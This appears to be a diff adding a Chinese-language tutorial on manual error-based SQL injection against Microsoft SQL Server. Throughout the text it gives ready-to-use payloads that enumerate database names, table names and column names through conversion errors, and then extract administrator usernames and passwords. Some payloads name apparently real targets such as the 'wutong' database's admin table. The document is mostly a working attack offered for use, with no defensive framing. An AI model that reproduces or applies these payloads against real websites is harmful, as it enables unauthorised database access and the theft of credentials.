@@ -1,0 +1,55 @@
+
+MSSQL手注暴库
+
+1．暴出当前表名和列名
+在注入点后提交“'having 1=1--"，得到返回信息为英文，在这段英文中即可看到一个表名和一个列名。提交“group by 暴出的表名列名having 1=1--"，可得到另一个列名；继续提交“group by 暴了的表名列名,暴出的表名.第2个列名 having 1=1--"，可再得到一个列名。用同样的方法提交，直到页面不再返回错误信息，就可以得到所有的列名。小知识：暴表名与列名是在SQL语句中“having 1=1—"与GROUP BY结合使用，进行条件判断的。由于语句不完整，因此数据库返回错误信息，并显示一个表名和一个列名。基本方法只能暴出数据库中的当前表，如果某个表中包含的列名非常多，用上基本方法就非常困难了。
+
+第一.爆出所有数据库名
+利用“and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=[N])"语句，暴出数据库中任意表名和列名，其中“[N]"表示数据库中的第N个表。
+第一步：在注入点后提交如下语句：“and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=12)"，因为 dbid 的值从1到5，是系统使用的，所以用户自己建的一定是从6开始的，并且我们提交了 name>1，name字段是一个字符型的字段，和数字比较会出错因此在提交后，IE会返回如下的信息：“Microsoft OLE DB Provider for ODBC Drivers 错误 ?e07' [Microsoft][ODBC SQL Server Driver][SQL Server]将 nvarchar 值 'Northwind' 转换为数据类型为 int 的列时发生语法错误。"，这样就把name字段的值暴出来了，也就是我们得到了一个库名“Northwind"。改变“dbid"的值可以得出所有的库名。
+
+and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=[N])--  修改N从6开始爆出所有数据库名
+
+
+第二.爆出指定库中的所有表名
+得到了库名后，现在要得到库中所有的表名，提交如下语句："and 0<>(select top 1 name from master.dbo.sysobjects where xtype='U') "，这里要暴的是master这个库中的表名，查询的SQL语句返回的是name的值，然后和数字0比较，这样就会暴露出name的值。提交后一个表名为“'spt_monito"就被暴出来了。
+再接着暴其他的表，继续提交如下语句：“and 0<>(select top 1 name from master.dbo.sysobjects where xtype='U' and name not in('spt_monito'))"提交后，又暴出一个表名为"cd512"。依次提交"and name not in(' spt_monito',' cd512',..))"就可以查出所有的表名。
+
+and 0<>(select top 1 name from [指定库名].dbo.sysobjects where xtype='U')--
+and 0<>(select top 1 name from [指定库名].dbo.sysobjects where xtype='U' and name not in('[爆出的表名]'))--
+and 0<>(select top 1 name from [指定库名].dbo.sysobjects where xtype='U' and name not in('[爆出的表名]','[爆出的第二表名]'))--
+
+4.爆出指定表中的所有列名
+and 0<>(select count(*) from bbs.dbo.sysobjects where xtype='U' and name='admin' and uid>(str(id))) 
+//把ID值转成字符型后再和一个整型值比较。ID号出来了。值为：949578421  name='表名'
+
+and 0<>(select top 1 name from wutong.dbo.syscolumns where id=949578421)--  爆出admin表中的一个字段名
+
+再提交and 0<>(select top 1 name from wutong.dbo.syscolumns where id=949578421 and name not in('adduser'))-- 
+依次提交"and name not in(' spt_monito',' cd512',..))"就可以查出admin表中的所有字段名。
+
+
+and 0<>(select count(*) from [指定库名].dbo.sysobjects where xtype='U' and name='[要爆字段的表名]' and uid>(str(id)))--  爆出要爆字段的表名id值
+
+and 0<>(select top 1 name from [指定库名].dbo.syscolumns where id=爆出的id值)-- 爆出id值表中的一个字段名
+
+and 0<>(select top 1 name from [指定库名].dbo.syscolumns where id=爆出的id值 and name not in('[爆出的字段名]'))-- 
+
+
+
+5．读取指定表中的数据
+
+and 0<(select A_ID from wutong.dbo.admin where A_UserID>1)-- 爆出A_PWD的内容 
+
+and 0<(select [一个存在的字段] from [指定库名].dbo.[要查询的表名] where [要爆内容的字段名]>1)--
+
+and 0<(select A_ID from wutong.dbo.admin where A_PWD>1 and A_UserID='admin')-- 爆出admin的密码
+
+
+and 0<(Select Top 1 A_UserID FROM admin where A_ID<>1)--  爆出id<>1的管理员名字(fuhao)
+
+and 0<(Select Top 1 A_UserID FROM admin where A_ID <>1 and A_UserID <> 'fuhao')-- 爆出第二个管理员的名字 <>不等于(tuiguang)
+
+and 0<(Select Top 1 A_UserID FROM admin where  A_ID <>1 and A_UserID <> 'fuhao'and A_UserID <> 'tuiguang')--
+
+知道了数据库的表名、列名后，可以利用“查询语句"读取数据库中的任意信息。例如要读取某个表中某列中的第N个数据，可提交语句：“and (Select Top 1 列名 FROM 表名 where id=[N])>1"（ [N]代表列中的第N条数据），从IE返回信息中即可得知想要的数据
